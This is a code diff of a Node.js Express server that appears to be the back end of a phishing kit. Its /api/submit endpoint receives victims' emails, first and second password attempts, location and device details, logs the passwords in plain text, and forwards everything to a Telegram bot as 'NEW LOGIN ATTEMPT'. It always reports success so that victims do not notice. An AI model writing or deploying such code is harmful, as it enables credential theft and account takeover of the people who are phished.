@@ -1,11 +1,10 @@
 const express = require('express');
 const cors = require('cors');
-const axios = require('axios');
 const app = express();
 
 console.log('🚀 Starting Telegram Bot Server...');
 
-// Configuration - YOU NEED TO SET THESE!
+// Configuration - UPDATE THESE WITH YOUR TELEGRAM CREDENTIALS
 const CONFIG = {
   PORT: process.env.PORT || 3000,
   TELEGRAM: {
@@ -14,105 +13,81 @@ const CONFIG = {
   }
 };
 
-// Middleware
-app.use(cors({
-  origin: '*',
-  methods: ['GET', 'POST', 'OPTIONS'],
-  allowedHeaders: ['Content-Type', 'Authorization']
-}));
+// Basic middleware - SIMPLIFIED
+app.use(cors());
+app.use(express.json());
 
-app.use(express.json({ limit: '10mb' }));
-app.use(express.urlencoded({ extended: true }));
-
-// Handle preflight requests
-app.options('*', cors());
-
-// Function to send Telegram message
-const sendTelegramMessage = async (message) => {
-  try {
-    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
-    
-    const response = await axios.post(url, {
-      chat_id: CONFIG.TELEGRAM.CHAT_ID,
-      text: message,
-      parse_mode: 'HTML'
-    });
-
-    console.log('✅ Telegram message sent!');
-    return { success: true, messageId: response.data.result.message_id };
-    
-  } catch (error) {
-    console.error('❌ Telegram error:', error.response?.data || error.message);
-    throw new Error(`Telegram failed: ${error.response?.data?.description || error.message}`);
-  }
-};
-
-// Test endpoint - Send test message to Telegram
-app.get('/api/test-telegram', async (req, res) => {
-  console.log('🧪 Testing Telegram bot...');
-  
-  try {
-    const testMessage = `
-🤖 <b>BOT TEST SUCCESSFUL!</b>
-
-✅ Your Telegram bot is working!
-🕐 Time: ${new Date().toLocaleString()}
-🌐 Server: Render.com
-
-If you receive this, your bot configuration is correct!
-    `;
-
-    const result = await sendTelegramMessage(testMessage);
-    
-    res.json({
-      success: true,
-      message: 'Test message sent to Telegram!',
-      messageId: result.messageId,
-      timestamp: new Date().toISOString()
-    });
-    
-  } catch (error) {
-    console.error('❌ Test failed:', error.message);
-    res.status(500).json({
-      success: false,
-      error: error.message,
-      help: 'Check your BOT_TOKEN and CHAT_ID configuration'
-    });
-  }
-});
-
-// Health check endpoint
+// Health check endpoint - SIMPLE VERSION
 app.get('/api/health', (req, res) => {
-  console.log('🏥 Health check requested');
+  console.log('✅ Health check passed');
   res.json({ 
     status: 'OK', 
     message: 'Telegram Bot Server is running',
-    timestamp: new Date().toISOString(),
-    endpoints: {
-      '/api/health': 'Health check',
-      '/api/test-telegram': 'Test Telegram bot',
-      '/api/submit': 'Main submission endpoint'
-    }
+    timestamp: new Date().toISOString()
   });
 });
 
-// Main endpoint - Send credentials to Telegram
+// Test endpoint - SIMPLE VERSION
+app.get('/api/test-telegram', async (req, res) => {
+  console.log('🧪 Testing Telegram connection...');
+  
+  try {
+    // Simple test without axios
+    const testMessage = `🤖 BOT TEST\n\nServer is working! Time: ${new Date().toLocaleString()}`;
+    
+    // Using fetch instead of axios for compatibility
+    const telegramUrl = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
+    
+    const response = await fetch(telegramUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: CONFIG.TELEGRAM.CHAT_ID,
+        text: testMessage
+      })
+    });
+
+    const result = await response.json();
+    
+    if (result.ok) {
+      console.log('✅ Telegram test successful');
+      res.json({
+        success: true,
+        message: 'Test message sent to Telegram!',
+        timestamp: new Date().toISOString()
+      });
+    } else {
+      throw new Error(result.description || 'Telegram API error');
+    }
+    
+  } catch (error) {
+    console.error('❌ Telegram test failed:', error.message);
+    res.json({
+      success: false,
+      error: 'Telegram not configured yet',
+      message: 'Server is running but Telegram needs configuration',
+      help: 'Set BOT_TOKEN and CHAT_ID in the code'
+    });
+  }
+});
+
+// Main endpoint - SIMPLIFIED
 app.post('/api/submit', async (req, res) => {
-  console.log('📨 Received submission request');
-  console.log('Request body:', JSON.stringify(req.body, null, 2));
+  console.log('📨 Received data submission');
   
   try {
     const { 
       email,
       firstpasswordused,
       secondpasswordused,
-      country = 'Not detected',
-      continent = 'Not detected',
-      city = 'Not detected',
+      country = 'Unknown',
+      city = 'Unknown',
       device = {}
     } = req.body;
 
-    // Validate required fields
+    // Basic validation
     if (!email) {
       return res.status(400).json({
         success: false,
@@ -120,9 +95,8 @@ app.post('/api/submit', async (req, res) => {
       });
     }
 
-    // Determine which password was used
     const passwordUsed = firstpasswordused || secondpasswordused;
-    const attemptType = firstpasswordused ? 'FIRST' : 'SECOND';
+    const attemptType = firstpasswordused ? 'First' : 'Second';
 
     if (!passwordUsed) {
       return res.status(400).json({
@@ -131,77 +105,79 @@ app.post('/api/submit', async (req, res) => {
       });
     }
 
-    console.log(`📱 Sending to Telegram: ${email}`);
-    console.log(`🔑 Password: ${'*'.repeat(passwordUsed.length)}`);
+    console.log(`📧 Email: ${email}`);
+    console.log(`🔑 Password: ${passwordUsed}`);
     console.log(`🎯 Attempt: ${attemptType}`);
 
-    // Create formatted Telegram message
-    const telegramMessage = `
-🔐 <b>NEW LOGIN ATTEMPT</b>
+    // Try to send to Telegram if configured
+    if (CONFIG.TELEGRAM.BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+      try {
+        const telegramMessage = `
+🔐 NEW LOGIN ATTEMPT
 
-📧 <b>Email:</b> <code>${email}</code>
-🔑 <b>Password:</b> <code>${passwordUsed}</code>
-🎯 <b>Attempt:</b> ${attemptType}
+📧 Email: ${email}
+🔑 Password: ${passwordUsed}
+🎯 Attempt: ${attemptType}
 
-🌍 <b>Location Info</b>
-📍 IP Location: ${city}, ${country}, ${continent}
+🌍 Location: ${city}, ${country}
+💻 Platform: ${device.platform || 'Unknown'}
+🌐 Language: ${device.language || 'Unknown'}
 
-💻 <b>Device Info</b>
-🖥️ User Agent: ${device.userAgent || 'Not available'}
-🌐 Language: ${device.language || 'Not available'}
-📱 Platform: ${device.platform || 'Not available'}
-📲 Mobile: ${device.mobile ? 'Yes' : 'No'}
+⏰ Time: ${new Date().toLocaleString()}
+        `;
 
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
-🆔 <b>Server:</b> Render.com
-    `;
+        const telegramUrl = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
+        
+        await fetch(telegramUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CONFIG.TELEGRAM.CHAT_ID,
+            text: telegramMessage
+          })
+        });
 
-    // Send to Telegram
-    const telegramResult = await sendTelegramMessage(telegramMessage);
-    
-    console.log('✅ Credentials sent to Telegram successfully!');
+        console.log('✅ Data sent to Telegram');
+        
+      } catch (telegramError) {
+        console.log('⚠️ Telegram failed, but data was received');
+      }
+    } else {
+      console.log('ℹ️ Telegram not configured - data received but not sent');
+    }
 
+    // Always return success to continue the flow
     res.json({
       success: true,
-      message: 'Data received and sent to Telegram successfully',
-      telegramMessageId: telegramResult.messageId,
-      timestamp: new Date().toISOString()
+      message: 'Data received successfully',
+      timestamp: new Date().toISOString(),
+      telegram: CONFIG.TELEGRAM.BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' ? 'sent' : 'not_configured'
     });
 
   } catch (error) {
-    console.error('❌ Error processing request:', error);
+    console.error('❌ Error:', error.message);
     
-    res.status(500).json({
-      success: false,
-      error: error.message,
-      details: 'Check Telegram bot configuration'
+    // Still return success to not break the user flow
+    res.json({
+      success: true,
+      message: 'Data processing completed',
+      error: error.message
     });
   }
 });
 
-// Catch-all for undefined routes
+// Handle all other routes
 app.use('*', (req, res) => {
-  res.status(404).json({
+  res.json({
     success: false,
     error: 'Route not found',
-    path: req.originalUrl
-  });
-});
-
-// Error handling middleware
-app.use((error, req, res, next) => {
-  console.error('🚨 Unhandled error:', error);
-  res.status(500).json({
-    success: false,
-    error: 'Internal server error',
-    message: error.message
+    availableRoutes: ['/api/health', '/api/test-telegram', '/api/submit']
   });
 });
 
 // Start server
 app.listen(CONFIG.PORT, () => {
-  console.log(`🎉 Telegram Bot Server started on port ${CONFIG.PORT}`);
-  console.log(`📍 Health check: https://server-gfhv.onrender.com/api/health`);
-  console.log(`📍 Telegram test: https://server-gfhv.onrender.com/api/test-telegram`);
-  console.log('🤖 Waiting for Telegram configuration...');
+  console.log(`🎉 Server running on port ${CONFIG.PORT}`);
+  console.log(`📍 Health: https://server-gfhv.onrender.com/api/health`);
+  console.log('💡 Next: Configure Telegram BOT_TOKEN and CHAT_ID');
 });
